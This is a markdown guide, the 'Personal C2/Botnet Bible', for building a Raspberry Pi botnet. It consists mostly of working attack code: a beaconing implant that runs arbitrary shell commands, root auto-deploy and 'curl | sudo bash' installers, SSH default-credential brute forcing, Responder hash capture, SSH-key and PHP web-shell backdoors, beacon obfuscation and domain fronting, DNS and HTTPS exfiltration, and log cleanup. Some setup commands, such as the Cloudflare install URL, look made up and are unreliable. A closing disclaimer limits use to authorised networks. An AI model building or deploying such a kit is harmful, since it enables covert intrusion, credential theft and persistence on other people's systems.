# Personal C2/Botnet Bible

## Architecture Overview

```
┌─────────────────────────────────────────┐
│            YOUR C2 SERVER               │
│    (VPS / Home Server / Pi 5)           │
│                                         │
│  ┌──────────┐ ┌──────────┐ ┌────────┐  │
│  │ Dashboard│ │ Command  │ │ Storage│  │
│  │  (Web)   │ │  Handler │ │ (DB)   │  │
│  └──────────┘ └──────────┘ └────────┘  │
└──────────────────┬──────────────────────┘
                   │ 
        ┌──────────┼──────────┬──────────┐
        │          │          │          │
   ┌────▼───┐  ┌──▼───┐  ┌───▼────┐ ┌──▼───┐
   │ Pi Zero│  │ Pi 3B│  │ Pi 4   │ │Pi Zero│
   │  node1 │  │node2 │  │ node3  │ │node4  │
   │  wlan0 │  │ eth0 │  │ wlan0  │ │ wlan0 │
   └────────┘  └──────┘  └────────┘ └───────┘
   
Locations: Home | Office | Remote | Mobile
```

---

## The "AutoBoros Mesh" Concept

### What It Is
Your network of Pi devices that:
- **Scans** their local network for targets
- **Exploits** found vulnerabilities (with auth)
- **Exfiltrates** hashes/passwords automatically
- **Reports back** to your C2
- **Stays persistent** via multiple methods

### Why Your Own Hardware
- **Legal** - It's YOUR equipment on YOUR networks
- **Unlimited** - No C2 hosting limits
- **Stealthy** - No suspicious IP patterns
- **Fast** - Local network = fast exploitation

---

## C2 Server Setup

### Option 1: VPS (Recommended)
```bash
# DigitalOcean / Linode / Hetzner
# 1 vCPU, 2GB RAM, 50GB SSD = ~$10/month

# Install C2
wget https://github.com/EmpireProject/Empire/archive/master.zip
unzip master.zip
cd Empire/setup

# Or use Mythic C2 (Go-based, modern)
wget https://github.com/its-a-feature/Mythic/releases
```

### Option 2: Home Server (Pi 5)
```bash
# On Pi 5 running Ubuntu Server
sudo apt update
sudo apt install docker docker-compose

# Install Mythic
git clone https://github.com/its-a-feature/Mythic
cd Mythic/docker
sudo docker-compose up -d
```

### Option 3: Cloud Tunnel
```bash
# Use Cloudflare Tunnel for home C2
# No port forwarding needed

curl -sL https://install.cloudflare.com.sh | sh
cloudflared tunnel create my-c2
cloudflared tunnel route ip add --v4 0.0.0.0/0 --label c2
```

---

## Agent/Implant Setup

### Python Implant (Lightweight)
```python
#!/usr/bin/env python3
"""
AutoBoros Node - Lightweight C2 Agent
Author: AutoBoros
Purpose: Personal network assessment
"""
import socket
import subprocess
import base64
import time
import json

class Node:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.hostname = socket.gethostname()
        self.register()
        
    def register(self):
        """Register with C2"""
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.c2_host, self.c2_port))
                data = json.dumps({
                    "type": "register",
                    "hostname": self.hostname,
                    "ip": socket.gethostbyname(socket.gethostname()),
                    "os": "linux",
                    "role": "scanner"
                })
                s.send(data.encode())
                s.close()
                break
            except:
                time.sleep(30)
                
    def handle_command(self, cmd):
        """Execute commands"""
        try:
            if cmd.startswith("scan"):
                return self.network_scan()
            elif cmd.startswith("exploit"):
                return self.run_exploit(cmd)
            elif cmd.startswith("shell"):
                return self.shell(cmd[6:])
            elif cmd == "update":
                return self.update_agent()
            else:
                return "Unknown command"
        except Exception as e:
            return str(e)
            
    def network_scan(self):
        """Quick local network scan"""
        result = subprocess.run(
            ["nmap", "-sn", "192.168.1.0/24", "-oG", "-"],
            capture_output=True, text=True
        )
        return result.stdout
        
    def run_exploit(self, target):
        """Run predefined exploits"""
        # Add your authorized exploits here
        return "Exploit module ready"
        
    def shell(self, cmd):
        """Execute shell command"""
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True
        )
        return result.stdout[:5000]
        
    def update_agent(self):
        """Update self from C2"""
        # Download new version from C2
        return "Updated"
        
    def beacon(self):
        """Main beacon loop"""
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((self.c2_host, self.c2_port))
                s.send(json.dumps({"type": "beacon", "hostname": self.hostname}).encode())
                cmd = s.recv(4096).decode()
                if cmd:
                    result = self.handle_command(cmd)
                    s.send(json.dumps({"type": "result", "data": result}).encode())
                s.close()
            except:
                pass
            time.sleep(30)

if __name__ == "__main__":
    # Replace with YOUR C2 IP
    node = Node("YOUR_C2_IP", 4444)
    node.beacon()
```

---

## Deployment Scripts

### Pi Zero W Auto-Deploy
```bash
#!/bin/bash
# auto-deploy.sh - Run on fresh Pi OS

# Update and install
sudo apt update
sudo apt install -y python3 python3-pip nmap curl git

# Create agent directory
mkdir -p ~/.autoBoros
cd ~/.autoBoros

# Download agent
curl -o node.py "YOUR_C2_URL/agent.py"

# Create systemd service
sudo cat > /etc/systemd/system/autoboros.service <<EOF
[Unit]
Description=AutoBoros Node
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.autoBoros
ExecStart=/usr/bin/python3 /root/.autoBoros/node.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
sudo systemctl enable autoboros
sudo systemctl start autoboros

echo "AutoBoros Node deployed!"
```

---

## Auto-Scan & Auto-Exploit Modules

### Network Discovery Module
```python
def auto_discover(self):
    """Auto-discover targets on local network"""
    targets = []
    
    # ARP scan
    result = subprocess.run(["arp-scan", "-l"], capture_output=True, text=True)
    for line in result.stdout.split("\n"):
        if "192.168" in line:
            ip = line.split()[0]
            targets.append(ip)
            
    # Quick port scan
    for ip in targets:
        ports = subprocess.run(
            ["nmap", "-p", "22,80,443,445,3389", "--open", ip],
            capture_output=True, text=True
        )
        if "22" in ports.stdout:  # SSH open
            targets.append({"ip": ip, "service": "SSH"})
        if "445" in ports.stdout:  # SMB open
            targets.append({"ip": ip, "service": "SMB"})
            
    return targets
```

### Credential Harvesting Module
```python
def harvest_creds(self):
    """Harvest credentials from compromised hosts"""
    creds = []
    
    # Check for known hashes
    result = subprocess.run(
        ["responder", "-I", "eth0", "--lm"],
        capture_output=True, text=True, timeout=60
    )
    
    # Try default/weak creds on found services
    wordlist = ["admin:admin", "admin:password", "root:root", "user:user"]
    for target in self.targets:
        for cred in wordlist:
            # Try SSH
            result = subprocess.run(
                ["sshpass", "-p", cred.split(":")[1], 
                 "ssh", "-o", "StrictHostKeyChecking=no",
                 f"{cred.split(':')[0]}@{target['ip']}", "echo ok"],
                capture_output=True, text=True
            )
            if "ok" in result.stdout:
                creds.append({"target": target["ip"], "user": cred.split(":")[0], "pass": cred.split(":")[1]})
                
    return creds
```

### Privilege Escalation Auto
```python
def auto_privesc(self):
    """Auto privilege escalation"""
    results = []
    
    # Check sudo
    result = subprocess.run(["sudo", "-l"], capture_output=True, text=True)
    if "NOPASSWD" in result.stdout:
        results.append({"method": "sudo_nopasswd", "output": result.stdout})
        
    # SUID check
    result = subprocess.run(
        ["find", "/", "-perm", "-4000", "-type", "f"],
        capture_output=True, text=True
    )
    results.append({"method": "suid_bins", "output": result.stdout})
    
    # LinPEAS download and run
    subprocess.run(
        ["curl", "-L", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", "-o", "/tmp/linpeas.sh"],
        capture_output=True
    )
    result = subprocess.run(["chmod", "+x", "/tmp/linpeas.sh"], capture_output=True)
    result = subprocess.run(["/tmp/linpeas.sh"], capture_output=True, text=True)
    results.append({"method": "linpeas", "output": result.stdout})
    
    return results
```

---

## C2 Dashboard

### Simple Python Dashboard
```python
from flask import Flask, render_template, request
import sqlite3

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('/root/.autoBoros/c2.db')
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def dashboard():
    conn = get_db()
    nodes = conn.execute("SELECT * FROM nodes").fetchall()
    results = conn.execute("SELECT * FROM results ORDER BY timestamp DESC LIMIT 50").fetchall()
    return render_template('dashboard.html', nodes=nodes, results=results)

@app.route('/command', methods=['POST'])
def command():
    node_id = request.form.get('node')
    cmd = request.form.get('command')
    conn = get_db()
    conn.execute("INSERT INTO commands (node_id, command) VALUES (?, ?)", (node_id, cmd))
    conn.commit()
    return "Command sent!"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

---

## Persistence Methods

### On Pi Nodes
```python
# 1. Systemd (already done above)

# 2. Cron
crontab -e
@reboot sleep 30 && /usr/bin/python3 /root/.autoBoros/node.py

# 3. SSH key backdoor (if root obtained)
if os.path.exists("/root/.ssh/authorized_keys"):
    with open("/root/.ssh/authorized_keys", "a") as f:
        f.write("\nYOUR_SSH_KEY\n")

# 4. Web shell persistence
# If you've compromised a web server:
# echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php
```

---

## Stealth & OPSEC

### Traffic Obfuscation
```python
# Obfuscate beacon traffic
import base64

def encode_cmd(cmd):
    # Base64 + slight encryption
    return base64.b64encode(cmd.encode()).decode()

def decode_cmd(encoded):
    return base64.b64decode(encoded.encode()).decode()
```

### Sleep & Jitter
```python
import random
import time

def beacon_with_jitter():
    base_sleep = 30  # 30 seconds
    jitter = random.randint(0, 60)  # 0-60 seconds random
    time.sleep(base_sleep + jitter)
```

### Rotate C2 Domains
```python
# List of C2 domains (if using domain fronting)
C2_DOMAINS = [
    "legit-site-1.cloudflare.com",
    "legit-site-2.cloudflare.com",
]
```

---

## Exfiltration

### Methods
```python
# 1. DNS Tunnel - send data via DNS queries
def exfil_dns(data):
    subdomain = f"{data}.your-tunnel-domain.com"
    subprocess.run(["nslookup", subdomain])
    
# 2. ICMP Tunnel - send data in ICMP packets
# 3. HTTPS - POST to your C2
# 4. Cloud Storage - Upload to your AWS S3 / Google Drive

# Recommended: HTTPS to your C2
def exfil_https(data):
    import requests
    requests.post("https://YOUR_C2/exfil", json=data, verify=False)
```

---

## Complete "Set and Forget" Script

### Full Auto-Pentest Node
```python
#!/usr/bin/env python3
"""
AutoBoros Auto-Pentest Node
RUNS AUTOMATICALLY - AUTHORIZED NETWORKS ONLY
"""
import socket
import subprocess
import time
import json
import os
import threading

class AutoPenterNode:
    def __init__(self):
        self.c2 = "YOUR_C2_IP"
        self.port = 4444
        self.lock = threading.Lock()
        
    def run_module(self, module):
        """Run a specific module"""
        results = []
        
        if module == "discovery":
            results.append(self.discovery())
        elif module == "smb_exploit":
            results.append(self.smb_exploit())
        elif module == "ssh_brute":
            results.append(self.ssh_brute())
        elif module == "http_exploit":
            results.append(self.http_exploit())
        elif module == "harvest":
            results.append(self.harvest())
            
        return results
        
    def discovery(self):
        """Network discovery"""
        output = subprocess.run(
            ["nmap", "-sn", "192.168.1.0/24", "-oG", "-"],
            capture_output=True, text=True
        ).stdout
        return {"module": "discovery", "output": output}
        
    def smb_exploit(self):
        """SMB exploitation"""
        # Add your CVE exploits here
        return {"module": "smb_exploit", "output": "Ready"}
        
    def ssh_brute(self):
        """SSH brute force"""
        # Add wordlist and targets
        return {"module": "ssh_brute", "output": "Ready"}
        
    def http_exploit(self):
        """HTTP exploitation"""
        # Scan for web vulns
        return {"module": "http_exploit", "output": "Ready"}
        
    def harvest(self):
        """Harvest credentials"""
        # Dump hashes, passwords
        return {"module": "harvest", "output": "Ready"}
        
    def main_loop(self):
        """Main beacon loop"""
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.c2, self.port))
                
                # Report status
                status = {"hostname": socket.gethostname(), "status": "alive"}
                s.send(json.dumps(status).encode())
                
                # Receive command
                cmd = s.recv(4096).decode()
                if cmd:
                    with self.lock:
                        result = self.run_module(cmd)
                    s.send(json.dumps(result).encode())
                s.close()
            except Exception as e:
                pass
            time.sleep(60)

if __name__ == "__main__":
    node = AutoPenterNode()
    node.main_loop()
```

---

## Mobile Access

### Telegram Bot Control
```python
# Add Telegram bot for mobile commands
import requests

def send_telegram(message):
    token = "YOUR_BOT_TOKEN"
    chat_id = "YOUR_CHAT_ID"
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    requests.post(url, {"chat_id": chat_id, "text": message})
```

---

## Cleanup & Getting Out Clean

```python
def cleanup():
    """Clean traces"""
    # Remove logs
    subprocess.run(["rm", "-rf", "/tmp/linpeas*"])
    subprocess.run(["history", "-c"])
    
    # Remove files
    subprocess.run(["rm", "-rf", "/root/.autoBoros/logs"])
    
    # Reset network
    # (optional, depends on operation)
```

---

## Legal Disclaimer

**IMPORTANT**: Only use on networks you own or have explicit written authorization for. This is for:
- Your home network
- Your company network (with permission)
- Client networks (with contract)
- Security research (within scope)

Unauthorized access is illegal. This is a security tool for authorized testing only.

---

## Quick Deploy Commands

### One-Line Pi Deploy
```bash
curl -sL YOUR_C2_URL/deploy.sh | sudo bash
```

### Update All Nodes
```bash
for node in $(cat nodes.txt); do
    ssh $node "curl -o /tmp/update.py YOUR_C2_URL/update.py && python3 /tmp/update.py"
done
```

---

## Glossary
- **C2** - Command & Control server
- **Beacon** - Periodic callback to C2
- **Implant** - Malware/agent on target
- **Stager** - Initial payload that downloads main implant
- **Opsec** - Operational Security
- **Pivot** - Move through compromised host
- **Lateral Movement** - Move across network
- **Persistence** - Stay on system after reboot
- **Exfil** - Exfiltration (data theft)